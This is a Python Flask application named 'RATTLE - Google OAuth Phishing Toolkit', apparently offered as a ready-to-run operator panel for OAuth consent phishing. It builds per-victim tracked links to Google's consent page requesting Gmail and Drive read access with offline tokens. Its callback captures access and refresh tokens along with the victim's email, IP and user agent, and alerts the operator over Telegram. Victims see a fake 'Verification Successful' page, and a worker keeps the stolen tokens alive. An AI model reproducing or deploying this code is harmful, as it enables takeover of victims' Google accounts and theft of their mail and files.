#!/usr/bin/env python3
# ============================================
# RATTLE - Google OAuth Phishing Toolkit
# Version: 1.1 (hardened)
# Coded by t.me/officialmonsterz
# ============================================

import base64
import json
import logging
import os
import secrets
from datetime import timedelta
from functools import wraps
from io import BytesIO
from urllib.parse import urlencode

import pyotp
import qrcode
import requests
from flask import (
    Flask,
    flash,
    jsonify,
    redirect,
    render_template,
    request,
    session,
    url_for,
)
from flask_migrate import Migrate
from sqlalchemy import text
from werkzeug.security import check_password_hash, generate_password_hash

from liveness import check_all_tokens, start_liveness_worker
from models import AuditLog, Campaign, Token, User, Victim, db, utcnow
from notifier import notify_new_token

# ============================================
# Configuration (config.py optional, env vars win)
# ============================================

try:
    from config import Config as _UserConfig
except ImportError:
    _UserConfig = None

log = logging.getLogger("rattle")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(name)s %(levelname)s %(message)s",
)

app = Flask(__name__)


def setting(name, default=""):
    """Read a setting: environment variable first, then config.py, then default."""
    env_value = os.environ.get(name)
    if env_value is not None and env_value != "":
        return env_value
    if _UserConfig is not None:
        return getattr(_UserConfig, name, default)
    return default


def load_or_create_secret_key():
    """
    Bug #1 fix: a SECRET_KEY that survives restarts and is identical across
    all gunicorn workers. Reads RATTLE_SECRET_KEY (env/config), otherwise
    generates one and persists it in the instance folder.
    """
    key = setting("RATTLE_SECRET_KEY", "")
    if key:
        return key
    os.makedirs(app.instance_path, exist_ok=True)
    key_file = os.path.join(app.instance_path, ".secret_key")
    if os.path.exists(key_file):
        with open(key_file, "r", encoding="utf-8") as fh:
            return fh.read().strip()
    key = secrets.token_hex(32)
    with open(key_file, "w", encoding="utf-8") as fh:
        fh.write(key)
    return key


app.config["SECRET_KEY"] = load_or_create_secret_key()
app.config["SQLALCHEMY_DATABASE_URI"] = setting("DATABASE_URL", "sqlite:///rattle.db")
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=8)

TELEGRAM_BOT_TOKEN = setting("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = setting("TELEGRAM_CHAT_ID", "")
TOKEN_CHECK_INTERVAL_MINUTES = setting("TOKEN_CHECK_INTERVAL_MINUTES", "30")
try:
    TOKEN_CHECK_INTERVAL_MINUTES = int(TOKEN_CHECK_INTERVAL_MINUTES)
except ValueError:
    TOKEN_CHECK_INTERVAL_MINUTES = 30

app.config["TOKEN_CHECK_INTERVAL_MINUTES"] = TOKEN_CHECK_INTERVAL_MINUTES

db.init_app(app)
migrate = Migrate(app, db)

GOOGLE_AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth"
GOOGLE_TOKEN_URL = "https://oauth2.googleapis.com/token"
GOOGLE_USERINFO_URL = "https://www.googleapis.com/oauth2/v2/userinfo"

# ============================================
# Custom Jinja2 Filters
# ============================================


@app.template_filter("json_loads")
def json_loads_filter(data):
    """Safely parse a JSON string for use in templates."""
    if not data:
        return {}
    try:
        return json.loads(data)
    except (ValueError, TypeError):
        return {}


# ============================================
# Audit log + auth helpers
# ============================================


def audit(action, detail=""):
    """Write one audit-log row. Never raises into the request."""
    try:
        entry = AuditLog(
            username=str(session.get("username", "anonymous"))[:80],
            action=str(action)[:64],
            detail=str(detail or "")[:512],
            ip=str(request.remote_addr or "")[:64],
        )
        db.session.add(entry)
        db.session.commit()
    except Exception:
        db.session.rollback()
        log.exception("audit log write failed")


def login_required(view):
    """Decorator replacing the repeated inline session checks."""

    @wraps(view)
    def wrapper(*args, **kwargs):
        if "user_id" not in session:
            if request.path.startswith("/api/") or request.path.startswith("/token/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect(url_for("login"))
        return view(*args, **kwargs)

    return wrapper


def _complete_login(user):
    session.clear()
    session["user_id"] = user.id
    session["username"] = user.username
    session.permanent = True
    audit("login_success", user.username)


# ============================================
# Create Default Admin User (hashed random password - bug #3 fix)
# ============================================


def create_default_admin():
    """On first run: create admin with a RANDOM password, shown once, stored hashed."""
    if User.query.count() > 0:
        return
    fixed = setting("RATTLE_INITIAL_PASSWORD", "")
    password = fixed if fixed else secrets.token_urlsafe(16)
    admin = User(username="rattle")
    admin.set_password(password)  # scrypt hash only - never stored in plain text
    db.session.add(admin)
    db.session.commit()
    if not fixed:
        log.warning(
            "FIRST RUN: generated admin password (shown ONCE, stored hashed): %s",
            password,
        )
    else:
        log.info("First-run admin created using RATTLE_INITIAL_PASSWORD from config")


# ============================================
# Authentication Routes (with TOTP MFA)
# ============================================


@app.route("/")
def index():
    if "user_id" in session:
        return redirect(url_for("dashboard"))
    return render_template("login.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            if user.totp_enabled and user.totp_secret:
                session["pending_2fa"] = user.id
                return redirect(url_for("mfa_verify"))
            _complete_login(user)
            return redirect(url_for("dashboard"))
        audit("login_failed", f"username={username}")
        return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")


@app.route("/mfa", methods=["GET", "POST"])
def mfa_verify():
    """Second login step: 6-digit TOTP code from the admin's authenticator app."""
    uid = session.get("pending_2fa")
    if not uid:
        return redirect(url_for("login"))
    user = db.session.get(User, uid)
    if user is None:
        return redirect(url_for("login"))
    if request.method == "POST":
        code = request.form.get("code", "").strip()
        if user.totp_secret and pyotp.TOTP(user.totp_secret).verify(code, valid_window=1):
            session.pop("pending_2fa", None)
            _complete_login(user)
            return redirect(url_for("dashboard"))
        audit("mfa_failed", user.username)
        return render_template("login.html", mfa_mode=True, error="Invalid code")
    return render_template("login.html", mfa_mode=True)


@app.route("/mfa/setup", methods=["GET", "POST"])
@login_required
def mfa_setup():
    """Generate a TOTP secret + QR, then verify one code to enable MFA."""
    user = db.session.get(User, session["user_id"])
    if request.method == "POST":
        code = request.form.get("code", "").strip()
        if user.totp_secret and pyotp.TOTP(user.totp_secret).verify(code, valid_window=1):
            user.totp_enabled = True
            db.session.commit()
            audit("mfa_enabled", user.username)
            flash("MFA enabled. You will need your authenticator code on next login.", "success")
            return redirect(url_for("dashboard"))
        audit("mfa_setup_failed", user.username)
        flash("Wrong code - try again.", "error")
    if not user.totp_secret:
        user.totp_secret = pyotp.random_base32()
        db.session.commit()
    uri = pyotp.totp.TOTP(user.totp_secret).provisioning_uri(
        name=user.username, issuer_name="Rattle"
    )
    img = qrcode.make(uri)
    buf = BytesIO()
    img.save(buf, format="PNG")
    qr_b64 = base64.b64encode(buf.getvalue()).decode()
    return render_template("mfa_setup.html", qr_b64=qr_b64, uri=uri)


@app.route("/mfa/disable", methods=["POST"])
@login_required
def mfa_disable():
    user = db.session.get(User, session["user_id"])
    user.totp_enabled = False
    user.totp_secret = ""
    db.session.commit()
    audit("mfa_disabled", user.username)
    flash("MFA disabled.", "success")
    return redirect(url_for("settings"))


@app.route("/logout")
def logout():
    audit("logout", session.get("username", ""))
    session.pop("user_id", None)
    session.pop("username", None)
    return redirect(url_for("login"))


# ============================================
# Health endpoint (new feature - for uptime monitoring)
# ============================================


@app.route("/health")
def health():
    ok = True
    try:
        db.session.execute(text("SELECT 1"))
    except Exception:
        ok = False
    return jsonify({"status": "ok" if ok else "degraded", "database": ok})


# ============================================
# Dashboard Routes
# ============================================


@app.route("/dashboard")
@login_required
def dashboard():
    total_campaigns = Campaign.query.count()
    total_victims = Victim.query.count()
    total_tokens = Token.query.count()
    active_campaigns = Campaign.query.filter_by(status="active").count()
    valid_tokens = Token.query.filter_by(status="valid").count()
    dead_tokens = Token.query.filter_by(status="dead").count()

    recent_tokens = Token.query.order_by(Token.captured_at.desc()).limit(10).all()

    victims_by_day = (
        db.session.query(
            db.func.date(Victim.first_seen).label("day"),
            db.func.count(Victim.id).label("count"),
        )
        .group_by(db.func.date(Victim.first_seen))
        .order_by(db.func.date(Victim.first_seen).desc())
        .limit(7)
        .all()
    )

    audit_logs = AuditLog.query.order_by(AuditLog.timestamp.desc()).limit(20).all()

    return render_template(
        "dashboard.html",
        total_campaigns=total_campaigns,
        total_victims=total_victims,
        total_tokens=total_tokens,
        active_campaigns=active_campaigns,
        valid_tokens=valid_tokens,
        dead_tokens=dead_tokens,
        recent_tokens=recent_tokens,
        victims_by_day=victims_by_day,
        audit_logs=audit_logs,
    )


# ============================================
# Campaign Routes
# ============================================


@app.route("/campaigns")
@login_required
def campaigns():
    all_campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template("campaigns.html", campaigns=all_campaigns)


@app.route("/campaign/create", methods=["GET", "POST"])
@login_required
def create_campaign():
    if request.method == "POST":
        campaign = Campaign(
            name=request.form.get("name"),
            description=request.form.get("description"),
            client_id=request.form.get("client_id"),
            client_secret=request.form.get("client_secret"),
            redirect_uri=request.form.get("redirect_uri", ""),
            scopes=request.form.get(
                "scopes",
                (
                    "openid profile email "
                    "https://www.googleapis.com/auth/gmail.readonly "
                    "https://www.googleapis.com/auth/drive.readonly"
                ),
            ),
        )
        campaign.generate_phishing_url()
        db.session.add(campaign)
        db.session.commit()
        audit("campaign_created", campaign.name)
        return redirect(url_for("campaign_detail", campaign_id=campaign.id))

    return render_template("campaign_create.html")


@app.route("/campaign/<int:campaign_id>")
@login_required
def campaign_detail(campaign_id):
    campaign = db.session.get(Campaign, campaign_id)
    if campaign is None:
        return "Campaign not found", 404
    victims = Victim.query.filter_by(campaign_id=campaign_id).all()
    tokens = (
        Token.query.filter_by(campaign_id=campaign_id)
        .order_by(Token.captured_at.desc())
        .all()
    )
    return render_template(
        "campaign_detail.html",
        campaign=campaign,
        victims=victims,
        tokens=tokens,
    )


@app.route("/campaign/<int:campaign_id>/add_target", methods=["POST"])
@login_required
def add_target(campaign_id):
    """Per-target tracked link (new feature)."""
    campaign = db.session.get(Campaign, campaign_id)
    if campaign is None:
        return "Campaign not found", 404
    label = request.form.get("label", "target").strip() or "target"
    victim = Victim(
        campaign_id=campaign.id,
        tracking_id=secrets.token_urlsafe(24),
        label=label,
    )
    db.session.add(victim)
    db.session.commit()
    audit("target_added", f"{campaign.name}:{label}")
    full_link = request.host_url.rstrip("/") + "/link/" + victim.tracking_id
    flash(f"Tracked link for {label}: {full_link}", "success")
    return redirect(url_for("campaign_detail", campaign_id=campaign.id))


@app.route("/campaign/<int:campaign_id>/delete", methods=["POST"])
@login_required
def delete_campaign(campaign_id):
    campaign = db.session.get(Campaign, campaign_id)
    if campaign is None:
        return jsonify({"error": "Not found"}), 404
    name = campaign.name
    db.session.delete(campaign)
    db.session.commit()
    audit("campaign_deleted", name)
    return jsonify({"success": True})


@app.route("/campaign/<int:campaign_id>/generate-qr")
@login_required
def generate_qr(campaign_id):
    campaign = db.session.get(Campaign, campaign_id)
    if campaign is None or not campaign.phishing_url:
        return jsonify({"error": "Not found"}), 404

    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(campaign.phishing_url)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()

    return jsonify({"qr_code": img_str})


# ============================================
# Per-target tracked link (new feature)
# ============================================


@app.route("/link/<tracking_id>")
def tracked_link(tracking_id):
    """
    Each target gets a unique /link/<code> URL. The click is counted, then
    the target is forwarded to the campaign's Google consent page with
    state=<tracking_id>, which comes back on /callback so we know exactly
    which target consented (fixes bug #4 - wrong campaign attribution).
    """
    victim = Victim.query.filter_by(tracking_id=tracking_id).first()
    if victim is None:
        return "Invalid link", 404
    campaign = victim.campaign
    if campaign is None or campaign.status != "active":
        return "Campaign inactive", 404

    # Atomic increment (no read-modify-write race)
    Victim.query.filter_by(id=victim.id).update(
        {"clicks": Victim.clicks + 1, "last_seen": utcnow()}
    )
    db.session.commit()

    params = {
        "client_id": campaign.client_id,
        "redirect_uri": campaign.redirect_uri,
        "response_type": "code",
        "scope": " ".join(campaign.scopes.split()),
        "access_type": "offline",
        "prompt": "consent",
        "state": tracking_id,
    }
    return redirect(GOOGLE_AUTH_URL + "?" + urlencode(params))


# ============================================
# Victim Routes
# ============================================


@app.route("/victims")
@login_required
def victims():
    all_victims = Victim.query.order_by(Victim.first_seen.desc()).all()
    return render_template("victims.html", victims=all_victims)


# ============================================
# Token Routes
# ============================================


@app.route("/tokens")
@login_required
def tokens():
    all_tokens = Token.query.order_by(Token.captured_at.desc()).all()
    return render_template("tokens.html", tokens=all_tokens)


@app.route("/api/token/<int:token_id>")
@login_required
def api_token(token_id):
    token = db.session.get(Token, token_id)
    if token is None:
        return jsonify({"error": "Not found"}), 404
    return jsonify(token.to_dict())


@app.route("/token/<int:token_id>/refresh", methods=["POST"])
@login_required
def refresh_token(token_id):
    """Manual refresh - also updates the liveness status (fixes bug #15)."""
    token = db.session.get(Token, token_id)
    if token is None:
        return jsonify({"error": "Not found"}), 404

    if not token.refresh_token:
        return jsonify({"error": "No refresh token available"}), 400

    data = {
        "client_id": token.campaign.client_id,
        "client_secret": token.campaign.client_secret,
        "refresh_token": token.refresh_token,
        "grant_type": "refresh_token",
    }
    try:
        response = requests.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
    except requests.RequestException:
        log.exception("manual refresh network error for token %s", token.id)
        return jsonify({"error": "Network error contacting Google"}), 502

    token.last_checked = utcnow()
    if response.status_code == 200:
        new_token = response.json()
        token.access_token = new_token.get("access_token")
        token.expires_in = new_token.get("expires_in")
        if token.expires_in:
            token.expiry_time = utcnow() + timedelta(seconds=int(token.expires_in))
        token.last_used = utcnow()
        token.status = "valid"
        token.is_active = True
        db.session.commit()
        audit("token_refreshed", f"token_id={token.id}")
        return jsonify({"success": True, "access_token": (token.access_token or "")[:30] + "..."})
    elif response.status_code in (400, 401, 403):
        token.status = "dead"
        token.is_active = False
        db.session.commit()
        return jsonify({"error": "Refresh failed - token is dead (revoked or expired)"}), 400
    else:
        token.status = "unknown"
        db.session.commit()
        return jsonify({"error": "Refresh failed"}), 400


@app.route("/token/<int:token_id>/check", methods=["POST"])
@login_required
def check_token_now(token_id):
    """Same as refresh, but for the button on the tokens page (returns to page)."""
    result = refresh_token(token_id)
    return result if isinstance(result, tuple) else redirect(url_for("tokens"))


@app.route("/token/<int:token_id>/delete", methods=["POST"])
@login_required
def delete_token(token_id):
    token = db.session.get(Token, token_id)
    if token is not None:
        db.session.delete(token)
        db.session.commit()
        audit("token_deleted", f"token_id={token_id}")
    return redirect(url_for("tokens"))


# ============================================
# Settings Route
# ============================================


@app.route("/settings", methods=["GET", "POST"])
@login_required
def settings():
    user = db.session.get(User, session["user_id"])
    if request.method == "POST":
        current = request.form.get("current_password", "")
        new = request.form.get("new_password", "")
        confirm = request.form.get("confirm_password", "")

        if not user.check_password(current):
            audit("password_change_failed", user.username)
            return render_template("settings.html", error="Current password is incorrect")

        if len(new) < 12:
            return render_template(
                "settings.html", error="New password must be at least 12 characters"
            )

        if new != confirm:
            return render_template("settings.html", error="Passwords do not match")

        user.set_password(new)
        db.session.commit()
        audit("password_changed", user.username)
        return render_template("settings.html", success="Password updated successfully!")

    return render_template("settings.html")


# ============================================
# API Routes
# ============================================


@app.route("/api/campaigns/stats")
@login_required
def campaign_stats():
    stats = {
        "total_campaigns": Campaign.query.count(),
        "total_victims": Victim.query.count(),
        "total_tokens": Token.query.count(),
        "active_campaigns": Campaign.query.filter_by(status="active").count(),
        "valid_tokens": Token.query.filter_by(status="valid").count(),
        "dead_tokens": Token.query.filter_by(status="dead").count(),
    }
    return jsonify(stats)


# ============================================
# OAuth Callback - Token Capture Endpoint
# ============================================


@app.route("/callback")
def oauth_callback():
    auth_code = request.args.get("code")
    if not auth_code:
        return "No authorization code received.", 400

    # Bug #4 fix: the tracked link carries the campaign identity in "state".
    state = request.args.get("state", "")
    victim = Victim.query.filter_by(tracking_id=state).first() if state else None

    if victim is not None:
        campaign = victim.campaign
    else:
        # Fallback for legacy untracked links: first active campaign.
        campaign = Campaign.query.filter_by(status="active").first()
        victim = None

    if not campaign:
        return "No active campaign found.", 400

    data = {
        "code": auth_code,
        "client_id": campaign.client_id,
        "client_secret": campaign.client_secret,
        "redirect_uri": campaign.redirect_uri,
        "grant_type": "authorization_code",
    }
    try:
        response = requests.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
    except requests.RequestException:
        log.exception("token exchange network error")
        return "Token exchange failed (network error).", 502

    if response.status_code != 200:
        audit("token_exchange_failed", campaign.name)
        return f"Token exchange failed: {response.text}", 400

    token_data = response.json()

    user_info = {}
    try:
        user_response = requests.get(
            GOOGLE_USERINFO_URL,
            headers={"Authorization": f"Bearer {token_data.get('access_token', '')}"},
            timeout=15,
        )
        if user_response.status_code == 200:
            user_info = user_response.json()
    except requests.RequestException:
        log.exception("userinfo fetch failed (continuing without it)")

    if victim is None:
        victim = Victim(
            campaign_id=campaign.id,
            email=user_info.get("email", "Unknown"),
            ip_address=request.remote_addr,
            user_agent=request.headers.get("User-Agent"),
            status="authorized",
        )
    else:
        victim.email = user_info.get("email", victim.email or "Unknown")
        victim.ip_address = request.remote_addr
        victim.user_agent = request.headers.get("User-Agent")

    victim.status = "authorized"
    db.session.add(victim)
    db.session.commit()

    token = Token(
        campaign_id=campaign.id,
        victim_id=victim.id,
        access_token=token_data.get("access_token"),
        refresh_token=token_data.get("refresh_token"),
        token_type=token_data.get("token_type"),
        expires_in=token_data.get("expires_in"),
        scope=token_data.get("scope"),
        user_info=json.dumps(user_info),
        expiry_time=utcnow() + timedelta(seconds=token_data.get("expires_in", 3600)),
        status="valid",
        last_checked=utcnow(),
    )
    db.session.add(token)
    db.session.commit()

    victim_label = victim.label or victim.email or "Unknown"
    audit("token_captured", f"{campaign.name}:{victim_label}")
    notify_new_token(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, campaign.name, victim_label, token.scope or "")

    log.info(
        "TOKEN CAPTURED email=%s campaign=%s token_id=%s",
        user_info.get("email", "Unknown"),
        campaign.name,
        token.id,
    )

    return """
    <html>
    <head>
        <title>Authentication Successful</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
            .icon { font-size: 64px; color: #34a853; }
            h2 { color: #202124; margin: 20px 0; }
            p { color: #5f6368; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">&#9989;</div>
            <h2>Verification Successful</h2>
            <p>You have successfully verified your identity.</p>
            <p style="font-size: 14px; color: #999; margin-top: 20px;">You will be redirected shortly...</p>
            <script>setTimeout(function(){ window.location.href = 'https://www.google.com'; }, 3000);</script>
        </div>
    </body>
    </html>
    """


# ============================================
# Manual liveness check for all tokens (button on tokens page)
# ============================================


@app.route("/tokens/check-all", methods=["POST"])
@login_required
def check_all_tokens_now():
    check_all_tokens(app)
    flash("Liveness check complete.", "success")
    return redirect(url_for("tokens"))


# ============================================
# Initialize Database
# ============================================

with app.app_context():
    db.create_all()
    create_default_admin()

start_liveness_worker(app)


# ============================================
# Main Entry Point
# ============================================

if __name__ == "__main__":
    print("=" * 60)
    print("RATTLE - Google OAuth Phishing Toolkit")
    print("=" * 60)
    print("Dashboard: /dashboard")
    print("Health:    /health")
    print("Tokens:    /tokens")
    print("=" * 60)
    print("For production, use:")
    print("   gunicorn -w 1 --threads 4 -b 127.0.0.1:8000 app:app")
    print("=" * 60)
    app.run(debug=False, host="127.0.0.1", port=8000)
